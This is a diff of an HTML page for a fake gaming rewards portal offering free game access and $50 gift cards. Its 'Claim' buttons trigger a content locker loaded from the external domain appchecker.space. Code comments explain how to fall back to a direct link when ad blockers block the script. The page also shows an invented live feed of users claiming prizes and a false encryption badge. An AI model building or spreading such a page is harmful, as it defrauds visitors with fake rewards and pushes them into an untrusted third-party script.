@@ -3,165 +3,212 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Gaming Rewards Portal | Exclusive Access</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&family=Orbitron:wght@600&display=swap" rel="stylesheet">
+    <title>Gemin Rewards - Ultimate Gaming Portal</title>
     
+    <script type="text/javascript" id="ogjs" src="https://appchecker.space/cl/js/5nl783"></script>
+
     <style>
         :root {
             --primary: #00ff95;
-            --blue: #3b82f6;
-            --pink: #f472b6;
-            --bg-dark: #0b0e14;
+            --secondary: #1a1f26;
+            --accent: #ff4d4d;
+            --bg: #0b0e14;
             --card-bg: #161b22;
         }
 
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, sans-serif; }
 
         body {
-            background-color: var(--bg-dark);
-            background-image: radial-gradient(circle at 50% 50%, #1c2533 0%, #0b0e14 100%);
-            color: #fff;
-            min-height: 100vh;
-            padding-bottom: 50px;
+            background-color: var(--bg);
+            color: #ffffff;
+            line-height: 1.6;
+            overflow-x: hidden;
         }
 
-        .navbar {
+        /* Background Animation */
+        body::before {
+            content: "";
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: radial-gradient(circle at 50% 50%, #1c2128 0%, #0b0e14 100%);
+            z-index: -1;
+        }
+
+        header {
             padding: 20px;
-            background: rgba(0, 0, 0, 0.4);
-            border-bottom: 1px solid rgba(255,255,255,0.05);
             text-align: center;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+            background: rgba(22, 27, 34, 0.8);
             backdrop-filter: blur(10px);
+            position: sticky; top: 0; z-index: 100;
         }
 
-        .navbar span {
-            font-family: 'Orbitron', sans-serif;
+        .logo {
             font-size: 1.5rem;
-            letter-spacing: 2px;
+            font-weight: 900;
             color: var(--primary);
+            letter-spacing: 2px;
             text-transform: uppercase;
         }
 
-        .hero { text-align: center; padding: 50px 20px; }
+        .hero {
+            padding: 60px 20px;
+            text-align: center;
+        }
+
         .hero h1 {
-            font-family: 'Orbitron', sans-serif;
-            font-size: 2.2rem;
+            font-size: 2.5rem;
             margin-bottom: 10px;
             background: linear-gradient(to right, #fff, var(--primary));
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
         }
 
+        .hero p { color: #8b949e; font-size: 1.1rem; }
+
         .container {
-            max-width: 1200px;
+            max-width: 1000px;
             margin: 0 auto;
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
-            gap: 30px;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 25px;
             padding: 20px;
         }
 
         .card {
             background: var(--card-bg);
             border-radius: 20px;
-            overflow: hidden;
-            border: 1px solid rgba(255,255,255,0.1);
-            transition: 0.3s ease;
+            padding: 25px;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            transition: 0.4s;
+            text-align: center;
             position: relative;
+            overflow: hidden;
         }
 
         .card:hover {
             transform: translateY(-10px);
             border-color: var(--primary);
-            box-shadow: 0 15px 30px rgba(0, 255, 149, 0.1);
+            box-shadow: 0 10px 30px rgba(0, 255, 149, 0.1);
         }
 
-        .card-img {
-            width: 100%;
-            height: 200px;
-            background-size: cover;
-            background-position: center;
-            background-color: #24292e;
-        }
+        .card h3 { margin-bottom: 15px; font-size: 1.3rem; }
 
-        /* صور خدامة 100% من سيرفرات ستيم الموثوقة */
-        .img-helldivers { background-image: url('https://cdn.akamai.steamstatic.com/steam/apps/553850/header.jpg'); }
-        .img-arc { background-image: url('https://cdn.akamai.steamstatic.com/steam/apps/1562930/header.jpg'); }
-        .img-kirby { background-image: url('https://cdn.akamai.steamstatic.com/steam/apps/1623920/header.jpg'); }
-
-        .card-content { padding: 25px; text-align: center; }
-
-        .badge {
-            position: absolute;
-            top: 15px;
-            left: 15px;
+        .tag {
             background: var(--primary);
             color: #000;
-            padding: 5px 12px;
-            border-radius: 8px;
+            font-size: 0.7rem;
             font-weight: bold;
-            font-size: 0.8rem;
-            z-index: 10;
+            padding: 4px 10px;
+            border-radius: 50px;
+            position: absolute;
+            top: 15px; right: 15px;
         }
-
-        .card h2 { font-family: 'Orbitron', sans-serif; margin-bottom: 15px; font-size: 1.3rem; }
 
         .btn {
             display: block;
-            background: linear-gradient(45deg, var(--primary), #00cc76);
+            width: 100%;
+            padding: 15px;
+            background: var(--primary);
             color: #000;
             text-decoration: none;
-            padding: 15px;
             border-radius: 12px;
-            font-weight: 700;
-            text-transform: uppercase;
-            transition: 0.3s;
-            cursor: pointer;
+            font-weight: bold;
+            margin-top: 20px;
             border: none;
-            width: 100%;
+            cursor: pointer;
+            transition: 0.3s;
+            text-transform: uppercase;
         }
 
-        .btn:hover { filter: brightness(1.2); }
+        .btn:hover { filter: brightness(1.1); }
+
+        .live-feed {
+            max-width: 450px;
+            margin: 40px auto;
+            background: rgba(255, 255, 255, 0.03);
+            border-radius: 12px;
+            padding: 15px;
+            font-size: 0.85rem;
+            color: #8b949e;
+        }
+
+        .feed-item {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 8px;
+            padding-bottom: 8px;
+            border-bottom: 1px solid rgba(255,255,255,0.05);
+        }
+
+        footer {
+            text-align: center;
+            padding: 40px;
+            color: #484f58;
+            font-size: 0.8rem;
+        }
+
+        /* Mobile Adjustments */
+        @media (max-width: 600px) {
+            .hero h1 { font-size: 1.8rem; }
+        }
     </style>
 </head>
 <body>
 
-    <nav class="navbar">
-        <span>ULTRA NET REWARDS</span>
-    </nav>
-
-    <header class="hero">
-        <h1>Exclusive Gaming Rewards 2026</h1>
-        <p>Select your game and complete the verification to claim your reward</p>
+    <header>
+        <div class="logo">GEMIN REWARDS</div>
     </header>
+
+    <div class="hero">
+        <h1>Unlocked Premium Content</h1>
+        <p>Select your reward below and verify your session.</p>
+    </div>
 
     <div class="container">
         <div class="card">
-            <div class="badge">ACTIVE</div>
-            <div class="card-img img-helldivers"></div>
-            <div class="card-content">
-                <h2>Helldivers 2</h2>
-                <a href="https://appchecker.space/cl/i/5nl783" class="btn">CLAIM REWARD</a>
-            </div>
+            <span class="tag">HOT</span>
+            <h3>Premium Gaming Pack</h3>
+            <p style="color:#8b949e; font-size: 0.9rem;">Access to 50+ New Releases</p>
+            <button onclick="startVerification();" class="btn">Claim Now</button>
         </div>
 
         <div class="card">
-            <div class="badge">EARLY ACCESS</div>
-            <div class="card-img img-arc"></div>
-            <div class="card-content">
-                <h2>Arc Raiders</h2>
-                <a href="https://appchecker.space/cl/i/5nl783" class="btn" style="background: var(--blue); color: #fff;">GET BETA KEY</a>
-            </div>
+            <h3>Exclusive Beta Access</h3>
+            <p style="color:#8b949e; font-size: 0.9rem;">Arc Raiders & Delta Force</p>
+            <button onclick="startVerification();" class="btn">Get Access</button>
         </div>
 
         <div class="card">
-            <div class="badge">HD EDITION</div>
-            <div class="card-img img-kirby"></div>
-            <div class="card-content">
-                <h2>Kirby Air Ride</h2>
-                <a href="https://appchecker.space/cl/i/5nl783" class="btn" style="background: var(--pink); color: #fff;">DOWNLOAD NOW</a>
-            </div>
+            <h3>Special Gift Cards</h3>
+            <p style="color:#8b949e; font-size: 0.9rem;">$50 Steam / Spotify / Netflix</p>
+            <button onclick="startVerification();" class="btn">Redeem</button>
         </div>
     </div>
+
+    <div class="live-feed">
+        <div style="margin-bottom:10px; font-weight:bold; color:var(--primary)">LIVE ACTIVITY:</div>
+        <div class="feed-item"><span>User @nabil*** just claimed</span> <span>$50 Steam Card</span></div>
+        <div class="feed-item"><span>User @vortex*** just claimed</span> <span>Beta Access</span></div>
+        <div class="feed-item"><span>User @otmane*** just claimed</span> <span>Gaming Pack</span></div>
+    </div>
+
+    <footer>
+        <p>AES-256 SSL Encrypted Connection</p>
+        <p>© 2026 Gemin Rewards Portal. Not affiliated with Steam, Spotify or Netflix.</p>
+    </footer>
+
+    <script>
+        function startVerification() {
+            // كنجربو نخدمو اللوكر بالسكريبت (أحسن طريقة)
+            if (typeof og_load === "function") {
+                og_load();
+            } else {
+                // إلا تبلوكا السكريبت بسبب AdBlock، كنصيفطوه للرابط المباشر
+                window.location.href = "https://appchecker.space/cl/i/5nl783";
+            }
+        }
+    </script>
 
 </body>
 </html>
